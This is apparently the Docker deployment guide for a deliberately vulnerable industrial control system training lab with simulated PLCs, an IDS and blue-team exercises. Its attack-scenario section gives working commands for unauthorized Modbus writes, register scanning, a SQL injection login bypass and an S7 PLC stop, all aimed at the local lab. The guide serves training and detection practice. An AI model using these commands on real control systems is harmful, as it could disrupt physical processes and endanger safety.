# Docker Deployment Guide

Quick start guide for running Vuln-PLC in Docker containers.

## Prerequisites

- Docker Engine 20.10+
- Docker Compose 2.0+
- 4GB RAM minimum, 8GB recommended
- 10GB disk space

## Quick Start

### 1. Basic Setup (Core Services)

Start 4 PLCs, Historian, and System Monitor:

```bash
docker-compose up -d
```

This launches:
- **PLC-1** (Tank Control): http://localhost:5000 + Modbus 5502
- **PLC-2** (Pressure): http://localhost:5011 + Modbus 5503
- **PLC-3** (Temperature): http://localhost:5012 + Modbus 5504
- **PLC-4** (Safety): http://localhost:5013 + Modbus 5505
- **Historian**: http://localhost:8888
- **System Monitor**: http://localhost:5999

### 2. Full Setup (All Services)

Include IDS, Network Simulator, and S7 Server:

```bash
docker-compose --profile full up -d
```

Additional services:
- **Modbus IDS**: Monitoring on 192.168.100.30
- **Network Simulator**: Realistic traffic generation
- **S7 Server**: Siemens S7 protocol on port 102

### 3. Check Status

```bash
docker-compose ps
```

### 4. View Logs

```bash
# All services
docker-compose logs -f

# Specific service
docker-compose logs -f plc1
docker-compose logs -f modbus_ids
docker-compose logs -f system_monitor
```

### 5. Stop Services

```bash
# Stop all
docker-compose down

# Stop and remove volumes (clean slate)
docker-compose down -v
```

## Network Architecture

```
┌─────────────────────────────────────────────────────┐
│  DMZ Network (192.168.50.0/24)                      │
│  ├─ Historian (192.168.50.10)                       │
│  └─ System Monitor (192.168.50.20)                  │
└─────────────────────────────────────────────────────┘
                         │
                         │ Bridged
                         │
┌─────────────────────────────────────────────────────┐
│  OT Network (192.168.100.0/24)                      │
│  ├─ PLC-1 (192.168.100.10)                          │
│  ├─ PLC-2 (192.168.100.11)                          │
│  ├─ PLC-3 (192.168.100.12)                          │
│  ├─ PLC-4 (192.168.100.13)                          │
│  ├─ Historian (192.168.100.20) - dual-homed         │
│  ├─ Modbus IDS (192.168.100.30)                     │
│  ├─ System Monitor (192.168.100.40) - dual-homed   │
│  ├─ Network Sim (192.168.100.50)                    │
│  └─ S7 Server (192.168.100.60)                      │
└─────────────────────────────────────────────────────┘
```

## Access Points

### Web Interfaces

| Service | URL | Credentials |
|---------|-----|-------------|
| PLC-1 | http://localhost:5000 | admin/admin |
| PLC-2 | http://localhost:5011 | engineer/plc2pass |
| PLC-3 | http://localhost:5012 | engineer/temp123 |
| PLC-4 | http://localhost:5013 | safety_eng/safe123 |
| Historian | http://localhost:8888 | historian/data123 |
| System Monitor | http://localhost:5999 | (no auth) |

### Modbus TCP Endpoints

Connect from host machine:

```bash
# PLC-1
sudo modbus 127.0.0.1:5502 read 0 10

# PLC-2
sudo modbus 127.0.0.1:5503 write 10 100

# PLC-3
sudo modbus 127.0.0.1:5504 read 0 10

# PLC-4
sudo modbus 127.0.0.1:5505 read 0 10
```

Connect from inside Docker network:

```bash
docker-compose exec plc1 bash
modbus read 192.168.100.11:5503 0 10
```

### S7 Protocol (Full Profile Only)

```bash
# Requires snap7 client
pip install python-snap7

# Connect to S7 server
python3 -c "
import snap7
plc = snap7.client.Client()
plc.connect('localhost', 0, 1, 102)
print(plc.get_cpu_state())
plc.disconnect()
"
```

## Testing Attack Scenarios

### 1. Unauthorized Modbus Write

```bash
# From host
sudo modbus 127.0.0.1:5502 write 10 9999

# Check IDS alerts (if running full profile)
docker-compose logs modbus_ids | grep ALERT
```

### 2. Register Scanning

```bash
# Sequential scan (reconnaissance pattern)
for i in {0..50}; do
  sudo modbus 127.0.0.1:5502 read $i 1
  sleep 0.1
done

# Check for scan detection
docker-compose logs modbus_ids | grep SCAN
```

### 3. SQL Injection (PLC-1 Web Interface)

```bash
curl -X POST http://localhost:5000/login \
  -d "username=admin' OR '1'='1&password=anything"
```

### 4. Cross-PLC Attack

```bash
# Enter PLC-1 container
docker-compose exec plc1 bash

# Attack PLC-2 from inside network
modbus write 192.168.100.11:5503 20 0
```

### 5. S7 PLC Stop (DoS)

```python
import snap7
plc = snap7.client.Client()
plc.connect('localhost', 0, 1, 102)
plc.plc_stop()  # Vulnerability: No authentication!
```

## PCAP Capture

All Modbus traffic is captured to `/app/pcaps` (when IDS is running):

```bash
# Access PCAP files
docker-compose exec modbus_ids ls /app/pcaps

# Copy to host
docker cp vuln-modbus-ids:/app/pcaps/modbus_2024-12-07.pcap ./

# Analyze with Wireshark
wireshark modbus_2024-12-07.pcap
```

## Blue Team Exercises

### Exercise 1: Baseline Learning

1. Start full environment
2. Monitor dashboard: http://localhost:5999
3. Observe normal traffic patterns (15 minutes)
4. Document baseline metrics

### Exercise 2: Attack Detection

1. Generate test attacks (unauthorized writes, scans)
2. Monitor IDS alerts in real-time:
   ```bash
   docker-compose logs -f modbus_ids
   ```
3. Investigate alerts on System Monitor
4. Practice incident response procedures

### Exercise 3: Forensics

1. Capture PCAP during attack scenario
2. Export PCAP from container
3. Analyze with Wireshark/tcpdump
4. Reconstruct attack timeline

## Troubleshooting

### Port Conflicts

If ports are already in use:

```bash
# Check what's using port 5000
sudo lsof -i :5000

# Option 1: Stop conflicting service
sudo systemctl stop <service>

# Option 2: Edit docker-compose.yml to use different ports
# Change "5000:5000" to "5050:5000"
```

### Permission Errors (S7 Server)

S7 protocol requires port 102 (privileged):

```bash
# Ensure Docker has sufficient permissions
sudo usermod -aG docker $USER
newgrp docker

# Or run with sudo
sudo docker-compose --profile full up -d
```

### Container Crashes

Check logs for errors:

```bash
docker-compose logs <service_name>

# Example
docker-compose logs plc1
```

### Network Issues

Verify networks are created:

```bash
docker network ls | grep vulnerable_plc

# Inspect network
docker network inspect vulnerable_plc_ot_network
```

### Database Errors

Reset all data:

```bash
docker-compose down -v
docker-compose up -d
```

## Performance Tuning

### Resource Limits

Add to docker-compose.yml under each service:

```yaml
deploy:
  resources:
    limits:
      cpus: '0.5'
      memory: 512M
```

### Logging

Limit log size:

```yaml
logging:
  driver: "json-file"
  options:
    max-size: "10m"
    max-file: "3"
```

## Security Notes

⚠️ **WARNING: This is an intentionally vulnerable environment!**

- **NEVER** expose to the internet
- **ONLY** use in isolated lab environments
- **DO NOT** deploy on production networks
- **ALWAYS** run behind firewalls

## Advanced Usage

### Custom Network Configuration

Edit `docker-compose.yml` to change IP ranges:

```yaml
networks:
  ot_network:
    ipam:
      config:
        - subnet: 10.0.0.0/24
          gateway: 10.0.0.1
```

### Building Custom Images

```bash
# Build with custom tag
docker build -t vuln-plc:custom .

# Use custom image in docker-compose.yml
# Change "build: ." to "image: vuln-plc:custom"
```

### Scaling Services

```bash
# Run multiple instances (for load testing)
docker-compose up -d --scale plc1=3
```

### Integration with External Tools

```bash
# Nmap scan
nmap -p 502 192.168.100.10

# Metasploit module
msfconsole -x "use auxiliary/scanner/scada/modbusclient"

# Python attack script
docker-compose exec plc1 python3 attack_script.py
```

## Cleanup

### Remove All Containers and Volumes

```bash
docker-compose down -v
docker system prune -a
```

### Remove Images

```bash
docker rmi vulnerable_plc_plc1 vulnerable_plc_plc2 ...
```

## Documentation

- **ADVANCED_FEATURES.md**: PLC engine, IDS, S7 protocol
- **BLUE_TEAM_GUIDE.md**: Defense strategies and incident response
- **ATTACK_SCENARIOS.md**: Detailed exploitation techniques
- **DETECTION_PLAYBOOK.md**: IOCs and detection rules

## Support

For issues or questions:
- GitHub Issues: https://github.com/anthropics/claude-code/issues
- Documentation: See `docs/` directory

---

**Remember: Use responsibly and only in authorized lab environments!**
